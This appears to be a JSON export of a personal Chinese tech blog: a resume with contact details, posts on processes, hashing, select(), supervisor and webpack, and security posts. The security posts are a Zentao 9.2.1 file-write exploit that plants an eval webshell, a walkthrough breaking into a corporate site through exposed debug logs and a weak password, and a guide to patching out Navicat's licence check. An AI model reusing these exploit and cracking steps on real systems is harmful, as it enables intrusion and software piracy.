{"meta":{"title":"hooklife's blog","subtitle":"这个世界会好么？","description":"hooklife 的个人博客","author":"hooklife","url":"https://hooklife.me"},"pages":[{"title":"简历","date":"2020-04-14T03:59:02.113Z","updated":"2020-04-14T03:59:02.113Z","comments":false,"path":"resume/index.html","permalink":"https://hooklife.me/resume/index.html","excerpt":"","text":"个人信息 苗高鹏 1997.07.28 学历:中专 电话: 13019635349 邮箱: miaogaopeng123@gmail.com 博客: https://hooklife.me Github: https://github.com/hooklife 技能通用 有非常丰富的面向对象、MVC、事件、异步、响应式的实践经验 熟悉 HTTP 协议，有丰富的前后端分离开发经验，并且有丰富的接口对接、设计经验 对接过 支付宝、微信、连连支付等第三方接口 开发过大量微信程序PHP 熟悉 PHP5、PHP7 语法以及 PSR 标准 熟练掌握 Laravel，ThinkPHP 框架，并大概了解其原理可快速上手其他框架 对 swoole 有简单了解 对 PHP、PHP-FPM 原理有一定了解, 日常开发都很注意安全与提高性能的细节Linux 运维 能够熟练使用命令行完成各种日常任务。 熟悉计划任务、服务、进程等的管理，能够熟练搭建配置 PHP 环境MySQL 能针对 SQL、数据库进行性能调优 了解 MySQL 优化, 能根据业务选择合适的引擎、索引 能根据机器配置对 MySQL 参数进行调优Docker 熟练使用 Docker 作为日常开发工具，通过 docker-compose 能快速在本地/线上搭建各种开发/测试环境。 熟练编写 Dockerfile 能将各种服务镜像化便于开发、测试、部署。前端 了解 es6 webpack vuejs gulp 等前端技术并能编写简单应用 能够编写语义化的 HTML、CSS，实现较为复杂的布局 熟悉 jQuery / Bootstrap 的使用与扩展 工作经历沈阳云端科技有限公司(2014.6~2015.8)PHP程序员 互联网/电子商务 工作描述：担任技术主管，负责网站后台/api部分开发 沈阳中普互联网金融(2016.5~至今)PHP程序员 互联网/互联网金融 工作描述：负责公司P2P借贷项目API/微信部分编写 项目经历1.赚个房API接口项目编写 使用laravel框架编写的 RESTful 接口，使用 JWT 进行权限控制 使用 redis 自旋锁解决高并发标的超卖问题 使用Laravel Event 进行异步处理耗时任务，使用 Laravel Scheduling 进行定时对账与同步各套系统数据 使用 openresty + ELK 对用户请求进行记录并友好展示，使用 elastalert + 钉钉机器人 对接口进行监控与报警 并通过日志/火焰图 对性能优化，通过 MySQL 慢查日志对 SQL 语句与数据库结构优化，并尝试使用 Swoole 优化性能 使用openresty 对网站进行限流，防止用户突然涌入导致系统出现问题 使用 golang 编写监控 MySQL binlog 进而进行对程序的缓存进行更新 使用 docker 进行部署,使用 confd 进行动态更新配置。2.赚个房业绩系统编写 使用 golang 编写监控 MySQL binlog 的程序，并把数据库变化实时通知到 rabbitmq 使用 PHP 订阅 rabbitmq 对三个 Mysql 数据库的数据进行实时的同步/合并 使用 docker 进行部署。3.通知中心编写 使用 golang + grpc 编写通知中心服务,主要用来发送短信/邮件/微信的通知，是赚个房项目微服务化的第一步。4.华晨宝马投票项目编写 使用laravel框架编写，投票时使用mysql事务保证数据一致性，防止并发过高导致单账号多次投票问题 分析慢查询日志，对mysql慢查询进行索引、语句层面优化，对排行进行缓存优化 为防止并发过高,照成各种问题，使用 nginx 进行限流处理。3. 赚个房微信项目编写 使用 Vue + mintui 编写的手机端SPA页面 使用 vuex 存储用户信息 使用 axios 调用 API 接口。4.年会抽奖系统编写 使用laravel框架，预先生成中奖信息插入 redis，静态资源与页面全部扔到CDN上，抽奖时直接进行 redis 读取是否中奖 用户信息、日志全部使用redis做缓存，使用队列插入到mysql。单机能承受 1000+ 并发。 业余作品 (https://github.com/hooklife)1.thinkphp5-wechat描述:微信 SDK for thinkphp5, 基于 overtrue/wechat 2.斗鱼火箭监视自动抢鱼丸描述:chrome扩展 自动监视斗鱼火箭，自动抢宝箱鱼丸，拥有上万（http://www.52pojie.cn/thread-471893-1-1.html）使用者 3.dongtu-function描述: 使用函数云计算调用 FFMPEG,自动生成动图, 并上传到 Upyun 对象存储. https://github.com/hooklife/dongtu-function 4.pubg_recoil描述: 使用 golang 编写的 PUBG 自动压枪辅助"},{"title":"","date":"2020-04-14T03:59:02.113Z","updated":"2020-04-14T03:59:02.113Z","comments":false,"path":"tags/index.html","permalink":"https://hooklife.me/tags/index.html","excerpt":"","text":""},{"title":"","date":"2020-04-14T03:59:02.087Z","updated":"2020-04-14T03:59:02.087Z","comments":false,"path":"categories/index.html","permalink":"https://hooklife.me/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"进程、协程、线程","slug":"进程、协程、线程","date":"2020-04-14T03:46:10.000Z","updated":"2020-04-14T06:07:15.736Z","comments":true,"path":"uncategorized/进程、协程、线程/","link":"","permalink":"https://hooklife.me/uncategorized/进程、协程、线程/","excerpt":"","text":"首先需要了解几个概念 并发 (Concurreny) 与 并行 (Parallelism) cbu0a-yilrd 并发1⼩小明可以⼀边玩⼿手机⼀边看电视。 事实上，⼩小明的眼睛在看电视的时候并不能看⼿手机，他在看手机的时候也没办法盯着电视屏幕。他的眼睛⻜快的在两个屏幕上切换 这不是真正意义上的同时进行，但⼜是客观存在同时进行两件事，这叫并发 并行1⼩明可以⼀边坐公交⼀边听音乐。 这两件事互不干扰，⼩明可以做到真正意义的同步同时进行，这叫并行 真正意义上的同时进行，这叫并行 CPU 时间片时间片即 CPU 分配给各个程序的时间，在 Linux 的内核处理过程中，每一个进程/线程默认会有一个固定的时间片来执行命令（默认为1/100秒），每个进程/线程被分配一个时间段执行，使各个程序从表面上看是同时进行的。 如果在时间片结束时进程还在运行，则 CPU 将被剥夺并分配给另一个进程。如果进程在时间片结束前阻塞或结束，则 CPU 当即进行切换，而不会造成 CPU 资源浪费。由于只有一个 CPU ，一次只能处理程序要求的一部分，如何处理公平，一种方法就是引入时间片，每个程序轮流执行。 Timeslice 进程、线程和协程之间的区别进程(Process)进程让操作系统的并发成为了可能，它是资源分配的最小单位 。每个进程来对应一定的内存空间，并且只能使⽤它⾃⼰的内存空间，各个进程之间互不干扰。进程同时也保存了了程序每个时刻的运行状态，为 进程切换 提供了可能。当进程暂停时，它会保存当前进程的状态(进程标识，进程使⽤用的资源等)，在下一次切换回来时根据之前保存的状态进行恢复，接着继续执行。 特点 进程之间不共享任何状态 进程的调度由操作系统完成 每个进程都有自⼰独⽴的内存空间 由于进程⽐较重量，占据独立的内存，所以创建、销毁和上下⽂进程间的切换开销(栈、寄存器、 ⽂件句柄等)⽐较⼤。 由于进程间之间互不不干扰,各⾃拥有自⼰的内存空间, 因此相对于线程比较安全, 所以不同进程之间的数据只能通过 IPC (Inter-Process Communication) 进行通信共享，通讯效率比较低。 线程 (Thread)每个进程⾄至少有一个线程。线程是依赖于进程的，是操作系统能够进⾏运算调度的最小单位。也称为 「微进程」 。线程的出现是为了降低上下文切换的消耗，提⾼系统的并发性，并突破⼀个进程只能⼲一 样事的缺陷，使到进程内并发成为可能。 进程让操作系统的并发性成为了可能，⽽线程让进程的内部并发成为了可能。 特点 ⼀个进程可以包含多个线程，但是这些线程共享进程占有的内存地址空间和资源。线程之间共享变量，解决了了通讯麻烦的问题 线程能够共享进程的⼤部分资源，创建、销毁和上下文切换开销比较小。 线程之间的通讯除了了可以使用进程之间通讯的⽅式以外还可以通过共享内存的⽅式进行通信，通讯效率较高 多线程是不安全的,当一个线程崩溃了了,会导致整个进程也崩溃了,即其他线程也挂了, 但多进程⽽不 会,一个进程挂了了,另⼀个进程依然照样运行。 协程 (Coroutine)简介协程是一种⽤户态的轻量级线程，它的调度不来⾃于系统，⽽是完全来自于⽤用户控制。协程拥有⾃己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其 他地方，在切回来的时候，恢复先前保存的寄存器器上下文和栈，直接操作栈则基本没有内核切换的开销，所以上下文的切换非常快。不不过协程本身⽆法利用多核 CPU，因为它基于线程，⽽线程⼜依赖于进程。 特点 协程的调度完全由⽤用户控制 本身无法利用多核 CPU 可并发执行 更好的利用 CPU，不用把 CPU 浪费在线程调度和上下文切换上 协程可以更好的利用内存，不用全都分配⼀个偏大的空间，只需要分配需要的对应空间即可 协程需要保证程序是⾮堵塞 切换开销远比线程小 总结 对于 进程、线程，都是有内核进行调度，有 [CPU 时间片][CPU 时间片] 的概念 对于 协程(用户级线程)，这是对内核透明的，也就是系统并不知道有协程的存在，是完全由用户自己的程序进行调度的，因为是由用户程序自己控制，那么就很难像抢占式调度那样做到强制的 CPU 控制权切换到其他进程/线程，通常只能进行 协作式调度，需要协程自己主动把控制权转让出去之后，其他协程才能被执行到 进程 与 线程 在 linux 中的区别进程和线程其实在 linux 中区别并不大，具体内容可以查看这篇文章","categories":[],"tags":[]},{"title":"数组的底层实现：HashTable","slug":"数组的底层实现：HashTable.mdq","date":"2019-09-09T02:59:40.000Z","updated":"2020-04-14T03:59:02.086Z","comments":true,"path":"uncategorized/数组的底层实现：HashTable.mdq/","link":"","permalink":"https://hooklife.me/uncategorized/数组的底层实现：HashTable.mdq/","excerpt":"","text":"PHP 中的数组是一种强大且灵活的数据类型。 哈希 (Hash) Hash，一般翻译做”散列”，也有直接音译为”哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，而不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。 哈希表 (Hash table) 散列表（Hash table，也叫哈希表），是根据键（Key）而直接访问在内存存储位置的数据结构。也就是说，它通过计算一个关于键值的函数，将所需查询的数据映射到表中一个位置来访问记录，这加快了查找速度。 这个映射函数称做散列函数，存放记录的数组称做散列表 参考资料","categories":[],"tags":[]},{"title":"同步 I/O 多路复用之 select","slug":"SELECT、POLL和EPOLL","date":"2019-03-12T11:33:32.000Z","updated":"2020-04-14T03:59:02.085Z","comments":true,"path":"linux/SELECT、POLL和EPOLL/","link":"","permalink":"https://hooklife.me/linux/SELECT、POLL和EPOLL/","excerpt":"select() 赋予你同时监控多个 sockets 的能力，他会告诉你哪些 sockets 可以读取，哪些可以写入，哪些触发了异常。","text":"select() 赋予你同时监控多个 sockets 的能力，他会告诉你哪些 sockets 可以读取，哪些可以写入，哪些触发了异常。 使用1int select(int nfds,fd_set *readfds,fd_set *writeset,fd_set *exceptset,const struct timeval *timeout) nfdsnfds 是所有加入集合的句柄值的最大那个值还要加1 比如我们创建了3个句柄： 12345678910int sa, sb, sc;sa = socket(...); /* 分别创建3个句柄并连接到服务器上 */connect(sa,...);sb = socket(...);connect(sb,...);sc = socket(...);connect(sc,...);FD_SET(sa, &amp;rdfds);/* 分别把3个句柄加入读监视集合里去 */FD_SET(sb, &amp;rdfds);FD_SET(sc, &amp;rdfds); 在使用 select 函数之前，一定要找到3个句柄中的最大值是哪个，我们一般定义一个变量来保存最大值，取得最大 socket 值如下： 12345678int nfds = 0;if(sa &gt; maxfd) nfds = sa;if(sb &gt; maxfd) nfds = sb;if(sc &gt; maxfd) nfds = sc;ret = select(maxfd + 1,...); 为什么 +1？标准上说： nfds 参数是指定要测试的描述符范围。第一个描述符每次都会被检查，也就是说，从0到 nfds - 1 的描述符会被检查。 nfds 需要的不是文件描述符数量，而是 watch 范围的上限。3 为什么是最大的句柄？在 “Advanced Programming in the UNIX Environment” 中 W. Richard Stevens 说这是为了性能优化。 设置 nfds 为0？man page 讲到 一些代码中调用 select() 三个 set 都设置为空，nfds 为 0，和一个非空的 timeout，用来实现一个可移植的亚秒级别的 sleep 在 nanosleep 广泛支持前，select 是唯一可移植实现亚秒 sleep 的方法。4 readset，writeset，exceptset这三个参数都是 fd_set * 类型。 即我们在程序里要申明几个 fd_set 类型的变量，比如 rdfds, wtfds, exfds，然后把这个变量的地址 &amp;rdfds, &amp;wtfds, &amp;exfds 传递给 select 函数。 readset：当句柄的状态变成可读的时系统就会告诉 select 函数返回 writeset：句柄状态变成可写的时系统就会告诉select 函数返回 exceptset：特殊情况，即句柄上有特殊情况发生时系统会告诉 select函数返回。特殊情况比如对方通过一个socket句柄发来了紧急数据。 fd_set 可以理解为一个集合，这个集合中放的是文件描述符，可以通过以下的宏进行设置： 1234void FD_ZERO(fd_set *fdset); //清空集合void FD_SET(int fd, fd_set *fdset); //将一个给定的文件描述符加入集合之中void FD_CLR(int fd, fd_set *fdset); //将一个给定的文件描述符从集合中删除int FD_ISSET(int fd, fd_set *fdset); // 检查集合中指定的文件描述符是否可以读写 一个常见的用法：1234FD_ZERO(&amp;readset);FD_SET(fd,&amp;readset);select(fd+1,&amp;readset,NULL,NULL,NULL);if(FD_ISSET(fd,readset)&#123;……&#125; timevaltimeout为结构timeval，用来设置 select() 的等待时间，其结构定义如下 1234struct timeval &#123; long tv_sec; //seconds long tv_usec; //microseconds&#125;; 这个参数有三种可能 永远等待下去：仅在有一个描述字准备好I/O时才返回。为此，把该参数设置为空指针 NULL。 等待一段固定时间：在有一个描述字准备好I/O时返回，但是不超过由该参数所指向的 timeval 结构中指定的秒数和微秒数。 根本不等待：检查描述字后立即返回，这称为轮询。为此，该参数必须指向一个 timeval 结构，而且其中的定时器值必须为0。 返回值执行成功则返回文件描述词状态已改变的个数，如果返回0代表在描述词状态改变前已超过 timeout 时间，当有错误发生时则返回-1，错误原因存于 errno，此时参数 readfds，writefds，exceptfds 和 timeout 的值变成不可预测 优点目前几乎在支持所有平台，有良好的跨平台性。 缺点 每次调用 select，都需要把文件描述符集合从用户态拷贝到内核态，这个开销在fd很多时会很大 单个进程能监视的描述符存在最大限制，在 Linux 一般为1024，只能通过重新编译内核等复杂方式改变。 通过在内核遍历文件描述符来获取已经就绪的 socket。事实上，同时连接的大量客户端在一时刻可能只有很少的处于就绪状态，因此随着监视的描述符数量的增长，其效率也会线性下降。 下面是linux环境下select的一个简单用法1234567891011121314151617181920212223242526272829/*** select.c -- a select() demo*/#include &lt;stdio.h&gt;#include &lt;sys/time.h&gt;#define STDIN 0 // standard input 的 file descriptorint main() &#123; struct timeval tv; fd_set readfds; tv.tv_sec = 5; tv.tv_usec = 0; FD_ZERO(&amp;readfds); FD_SET(STDIN, &amp;readfds); // 不用管 writefds 與 exceptfds： select(STDIN + 1, &amp;readfds, NULL, NULL, &amp;tv); if (FD_ISSET(STDIN, &amp;readfds)) &#123; printf(\"A key was pressed!\\n\"); &#125; else &#123; printf(\"Time out.\\n\"); &#125; return 0;&#125; 参考资料：","categories":[{"name":"linux","slug":"linux","permalink":"https://hooklife.me/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://hooklife.me/tags/linux/"},{"name":"C++","slug":"C","permalink":"https://hooklife.me/tags/C/"}]},{"title":"某企业官网的一次渗透","slug":"某企业官网的一次渗透","date":"2018-09-09T05:00:12.000Z","updated":"2020-04-14T03:59:02.087Z","comments":true,"path":"安全/某企业官网的一次渗透/","link":"","permalink":"https://hooklife.me/安全/某企业官网的一次渗透/","excerpt":"","text":"信息获取确认程序使用语言/框架 通过请求的 X-Powered-By 头和 URL 的来看,猜测网站环境为:php + apache并使用 thinkphp 框架进行开发 尝试尝试使用 SQL 注入 尝试多个传参地址进行手动盲注，都失败，因为使用了框架的原因，可能过滤了大多数比较低级的注入 尝试 XSS 打后台 无奈发现网站中所有表单竟然都不能真实提交 尝试历史 thinkphp 漏洞基本没有能利用到这个网站中的，不知道是thinkphp的版本问题还是… 换种思路根据 thinkphp 默认路径尝试获取日志 发现网站竟然忘记关掉 debug !!!!!!,所有的SQL语句都暴漏了 根据猜测得知后端日志地址为 URL/Runtime/Logs/Manage/18_09_09.log 翻了翻,暂时没发现什么有用的东西 尝试写脚本爬取所有日志，一点一点筛查，发现并没有改密码的SQL 弱口令在日志中发现了几个登陆的用户名，经过简单尝试发现，其中一个账号的密码竟然是简单的 admin 真是白费了这么多功夫 结果 成功拿到后台,点到为止,也没有继续进行 getshell 什么的 总结 上线千万别忘记关闭 debug thinkphp 的程序建议简单修改程序,把index.php 移入 Public 文件夹中 加强密码管理,不要存在这么简单的密码 日志目录不要给可访问权限 尽量不要暴漏程序使用的语言/框架","categories":[{"name":"安全","slug":"安全","permalink":"https://hooklife.me/categories/安全/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://hooklife.me/tags/渗透/"}]},{"title":"记一次禅道渗透并获取webshell","slug":"记一次禅道渗透","date":"2018-03-12T09:33:32.000Z","updated":"2020-04-14T03:59:02.087Z","comments":true,"path":"安全/记一次禅道渗透/","link":"","permalink":"https://hooklife.me/安全/记一次禅道渗透/","excerpt":"有登陆权限,对 9.2.1 版本禅道渗透,获取webshell","text":"有登陆权限,对 9.2.1 版本禅道渗透,获取webshell 确认版本首先通过接口获取禅道版本http://127.0.0.1/index.php?mode=getconfig12345&#123; \"version\": \"9.2.1\", \"requestType\": \"PATH_INFO\",...&#125; 文件上传123URL:http://127.0.0.1/?m=api&amp;f=getModel&amp;moduleName=editor&amp;methodName=save&amp;params=filePath=a.phpMethod:POSTPayload:fileContent=&lt;?php $_POST[1]($_POST[2]); 直接提交发现报错: 无法写入，可能没有权限。请尝试执行 chmod 777 -R a.ph 具体什么原因我也不太清楚 查看源代码 module/editor/model.php 371行1234567891011121314151617181920public function save($filePath)&#123; $fileContent = $this-&gt;post-&gt;fileContent; $evils = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert'); $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t'); $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent); if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent); $dirPath = dirname($filePath); $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4); if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true); if(is_writable($dirPath)) &#123; file_put_contents($filePath, $fileContent); &#125; else &#123; die(js::alert($this-&gt;lang-&gt;editor-&gt;notWritable . $extFilePath)); &#125;&#125; 发现写入文件路径也可以控制. 随便访问个URL让他弹出错误信息 12ERROR: the control file /opt/zbox/app/zentao/module/indaafasf/control.php not found. in /opt/zbox/app/zentao/framework/base/router.class.php on line 1238, last called by /opt/zbox/app/zentao/framework/base/router.class.php on line 1357 through function setControlFile.in /opt/zbox/app/zentao/framework/base/router.class.php on line 1932 when visiting indaafasf 发现禅道路径在 /opt/zbox/app/zentao/ 查看源码得知 www 目录为可直接访问目录 直接上传文件123URL:http://127.0.0.1/?m=api&amp;f=getModel&amp;moduleName=editor&amp;methodName=save&amp;params=filePath=/opt/zbox/app/zentao/www/aaaaaa.phpMethod:POSTPayload:fileContent=&lt;?php file_put_contents($_POST[1],$_POST[2]); 访问上传后的文件 跳过检测上传一句话 12345URL:http://127.0.0.1/aaaaaa.phpMethod:POSTPayload:1=/opt/zbox/app/zentao/www/b.php2=&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt; 最后上一张菜刀图 总结这种上传文件的地方已经要做好路径/文件后缀名的限制. 可以上传的目录一定不要给PHP的权限. 蛋疼最后拿到了数据库发现管理员的密码竟然是默认密码…白忙活了这么多","categories":[{"name":"安全","slug":"安全","permalink":"https://hooklife.me/categories/安全/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://hooklife.me/tags/渗透/"},{"name":"webshell","slug":"webshell","permalink":"https://hooklife.me/tags/webshell/"}]},{"title":"ubuntu中使用webpack,部分文件不能自动reload的解决方法","slug":"ubuntu中使用webpack,部分文件不能自动reload的解决方法","date":"2017-12-21T09:10:00.000Z","updated":"2020-04-14T03:59:02.086Z","comments":true,"path":"前端/ubuntu中使用webpack,部分文件不能自动reload的解决方法/","link":"","permalink":"https://hooklife.me/前端/ubuntu中使用webpack,部分文件不能自动reload的解决方法/","excerpt":"在webstrome中开发,发现大部分文件是可以自动reload的,但是部分文件不能自动进行reload","text":"在webstrome中开发,发现大部分文件是可以自动reload的,但是部分文件不能自动进行reload 解决方法命令行中执行命令 在你的系统中修改足够的 inotify watches,让webpack能正常监控文件变化 1echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf &amp;&amp; sudo sysctl -p 参考资料 https://stackoverflow.com/questions/26708205/webpack-watch-isnt-compiling-changed-files https://webpack.github.io/docs/troubleshooting.html","categories":[{"name":"前端","slug":"前端","permalink":"https://hooklife.me/categories/前端/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://hooklife.me/tags/ubuntu/"},{"name":"webpack","slug":"webpack","permalink":"https://hooklife.me/tags/webpack/"}]},{"title":"supervisor在deepin安装、使用与卸载","slug":"Supervisor在deepin安装、卸载与使用","date":"2017-11-14T03:00:00.000Z","updated":"2020-04-14T03:59:02.085Z","comments":true,"path":"linux/Supervisor在deepin安装、卸载与使用/","link":"","permalink":"https://hooklife.me/linux/Supervisor在deepin安装、卸载与使用/","excerpt":"简介Supervisor是一个python开发的进程管理工具，你可以使用它对 UNIX-like 操作系统的多个进程进行控制和监控。","text":"简介Supervisor是一个python开发的进程管理工具，你可以使用它对 UNIX-like 操作系统的多个进程进行控制和监控。 安装1sudo apt-get install supervisor 使用1.配置创建一个配置文件在/etc/supervisor/conf.d 目录下，文件命名必须以.conf结尾。例如: idea-worker.conf内容大致如下123456[program:idea-worker]command=/root/IntelliJIDEALicenseServer_linux_amd64 //启动命令autostart=true // 在 supervisord 启动的时候也自动启动，如果设置为false 重启服务器后还需要手动执行命令进行运行autorestart=true // 程序异常退出后自动重启 设置为false supervisord 将不会在程序关闭后重新运行、设置stderr_logfile=/var/log/idea-worker.err.log // 错误日志stdout_logfile=/var/log/idea-worker.out.log // 所有日志 autostart 在 supervisord 启动的时候也自动启动 false：重启服务器后还需要手动执行命令进行运行 true： 重启服务器后自动运行 autorestart程序异常退出后自动重启false：supervisord 将不会在程序关闭后重新运行true：supervisord 将会在程序关闭后重新运行unexpected：supervisord 将在程序报异常的时候进行重启 stderr_logfile、stdout_logfile主要定义程序运行日志位置，指定的目录必须在启动程序前存在，supervisord不会创建目录，只会创建对应的文件 文档列出很多可以进行配置的选项，可以查阅官方手册 configuration 2.reload并应用配置12supervisorctl rereadsupervisorctl update 3.管理程序1supervisorctl 执行后进入supervisorctl界面，就可以对程序进行执行任务了12345start idea-workerstop idea-workerrestart idea-workerstatusquit 4.使用web界面管理程序supervisor 提供了通过浏览器来管理程序的方法。开启方法：1vi /etc/supervisor/supervisord.conf 添加这几行文字，1234[inet_http_server] ; inet (TCP) server disabled by defaultport=0.0.0.0:9001 ; (ip_address:port specifier, *:port for ;all iface)username=user ; (default is no username (open server))password=123 ; (default is no password (open server)) 打开 http://ip:9001 输入用户名密码，即可进入程序管理web界面 webui 默认外网可以进行访问，请自行修改账号密码 参考资料: How To Install and Manage Supervisor on Ubuntu and Debian VPS 使用 supervisor 管理进程 supervisor 安装配置使用 卸载1sudo apt purge supervisor 执行命令后 supervisor 正常被卸载supervisord 并没有被正常卸载 输入supervisord 命令后报错12345678910111213141516Traceback (most recent call last): File \"/usr/local/bin/supervisord\", line 6, in &lt;module&gt; from pkg_resources import load_entry_point File \"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py\", line 3019, in &lt;module&gt; @_call_aside File \"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py\", line 3003, in _call_aside f(*args, **kwargs) File \"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py\", line 3032, in _initialize_master_working_set working_set = WorkingSet._build_master() File \"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py\", line 655, in _build_master ws.require(__requires__) File \"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py\", line 963, in require needed = self.resolve(parse_requirements(requirements)) File \"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py\", line 849, in resolve raise DistributionNotFound(req, requirers)pkg_resources.DistributionNotFound: The 'supervisor==3.2.0' distribution was not found and is required by the application 执行1whereis supervisord 查找supervisord在哪12root@jdu4e00u53f7:~# whereis supervisordsupervisord: /usr/local/bin/supervisord 执行rm -rf /usr/local/bin/supervisord卸载成功","categories":[{"name":"linux","slug":"linux","permalink":"https://hooklife.me/categories/linux/"}],"tags":[{"name":"supervisor","slug":"supervisor","permalink":"https://hooklife.me/tags/supervisor/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://hooklife.me/tags/ubuntu/"},{"name":"deepin","slug":"deepin","permalink":"https://hooklife.me/tags/deepin/"}]},{"title":"记一次Navicat的爆破","slug":"Navicat的爆破","date":"2016-12-26T06:17:00.000Z","updated":"2020-04-14T03:59:02.085Z","comments":true,"path":"逆向/Navicat的爆破/","link":"","permalink":"https://hooklife.me/逆向/Navicat的爆破/","excerpt":"最近公司电脑的Navicat试用期过了，想找找其他Mysql管理的GUI，用了几款都不太好用，直接下载破解版的Navicat又感觉不是很舒服，总是感觉下载的破解版不是很干净。（对，我就是这么矫情） 那就只好动手了，下面记录了破解的过程与思路。 大家有经济实力的情况下还是要尽力的支持正版的，以下过程只做技术分享，切勿用于非法用途","text":"最近公司电脑的Navicat试用期过了，想找找其他Mysql管理的GUI，用了几款都不太好用，直接下载破解版的Navicat又感觉不是很舒服，总是感觉下载的破解版不是很干净。（对，我就是这么矫情） 那就只好动手了，下面记录了破解的过程与思路。 大家有经济实力的情况下还是要尽力的支持正版的，以下过程只做技术分享，切勿用于非法用途 破解过程载入到OD后运行，CTRL+G 输入 00401000 到达程序领空。 右键搜索字符串后搜索关键词“评估”，到达疑似程序弹出注册框的位置 20161229151447 到达段首（push ebp的位置），F2下断点，CTRL+F2重新运行程序 断下后我们F8向下跟，跟到这个位置后 20161229152103 可以看到这有个jnz是比较关键的，如果这个JNZ不跳的话，应该就会直接弹出试用过期的框， 那我们直接把jnz改成je跳过弹出注册框的部分，当然还没结束，事情没这么简单，我们发现改成je后运行Navicat直接闪退掉了，说明后面还是有相关的验证的。 那好吧，重新运行起来，把谈注册框的位置改成je后我们继续往下面跟 到达这个位置后 20161229152819 发现了这个字符串，应该就是Navicat的主体窗口了，我们就想办法让他运行到这 20161229152953 到这步后，如果jnb跳转不成立的话，就会走到jmp处，然后就会跳过TNavicatMainForm 这个位置，显然是不行的，我们只好吧jnb改成jmp让他跳过这个jmp 20161229153204 当走到这个call的位置的时候，我们发现任务栏的navicat已经变成两个了（应该是一个是启动界面，一个已经进入了主界面）也基本证明了猜想这部分就是在创建navicat的主窗口。然而我们直接运行起来，发现navitcat还是会闪退，那就说明这个位置之后还是有验证，那就只好继续跟了。 20161229153421 再跟不远之后就发现了关键的退出call(f8到这个call的位置时，进程停止)，发现上面有个je 改成jmp 运行。 好了运行成功了，试了下功能 基本都是好使的。到此就破解完成了","categories":[{"name":"逆向","slug":"逆向","permalink":"https://hooklife.me/categories/逆向/"}],"tags":[{"name":"爆破","slug":"爆破","permalink":"https://hooklife.me/tags/爆破/"},{"name":"逆向","slug":"逆向","permalink":"https://hooklife.me/tags/逆向/"},{"name":"navicat","slug":"navicat","permalink":"https://hooklife.me/tags/navicat/"}]},{"title":"linux给指定用户生成sshkey","slug":"linux给指定用户生成sshkey","date":"2016-10-30T16:00:00.000Z","updated":"2020-04-14T03:59:02.086Z","comments":true,"path":"linux/linux给指定用户生成sshkey/","link":"","permalink":"https://hooklife.me/linux/linux给指定用户生成sshkey/","excerpt":"","text":"1sudo -u apache ssh-keygen -t rsa 参考资料:https://stackoverflow.com/questions/7306990/generating-ssh-keys-for-apache-user","categories":[{"name":"linux","slug":"linux","permalink":"https://hooklife.me/categories/linux/"}],"tags":[{"name":"ssh","slug":"ssh","permalink":"https://hooklife.me/tags/ssh/"}]},{"title":"webpack+vue单个components引用单独的css文件","slug":"webpack+vue单个components引用单独的css文件","date":"2016-10-21T09:10:00.000Z","updated":"2020-04-14T03:59:02.086Z","comments":true,"path":"前端/webpack+vue单个components引用单独的css文件/","link":"","permalink":"https://hooklife.me/前端/webpack+vue单个components引用单独的css文件/","excerpt":"因为多个componets中css定义有冲突 所以每个componets必须要单独加载他自己的css","text":"因为多个componets中css定义有冲突 所以每个componets必须要单独加载他自己的css 直接 improt 的话 webpack 就会把所有的css样式生成一个大的css，由于当初编写css命名不是很好，很多classname都是重复的，然后页面就会各种错乱。 找了半天也没找到compoents 动态加载css的方法 但是找到了一个算是比较好的办法 在componets 中 使用这种形式去引用css 1&lt;style scoped src=\"xxx.css\"&gt;&lt;/style&gt; webpack打包的时候会在 css 中自动加上当前components的前缀 就能完美解决各个components css冲突的问题啦 参考资料（我本人的提问）： https://segmentfault.com/q/1010000007093036 https://www.v2ex.com/t/311109","categories":[{"name":"前端","slug":"前端","permalink":"https://hooklife.me/categories/前端/"}],"tags":[{"name":"webpack","slug":"webpack","permalink":"https://hooklife.me/tags/webpack/"},{"name":"vue","slug":"vue","permalink":"https://hooklife.me/tags/vue/"}]},{"title":"ubuntu 上安装/卸载php7","slug":"ubuntu 上安装卸载php7","date":"2016-10-17T09:29:00.000Z","updated":"2020-04-14T03:59:02.086Z","comments":true,"path":"linux/ubuntu 上安装卸载php7/","link":"","permalink":"https://hooklife.me/linux/ubuntu 上安装卸载php7/","excerpt":"","text":"添加PHP源123sudo apt-get install python-software-properties software-properties-commonsudo LC_ALL=C.UTF-8 add-apt-repository ppa:ondrej/phpsudo apt-get update 安装PHP7和常用扩展1sudo apt-get install php7.0 php7.0-fpm php7.0-mysql -y 卸载php71sudo apt-get purge 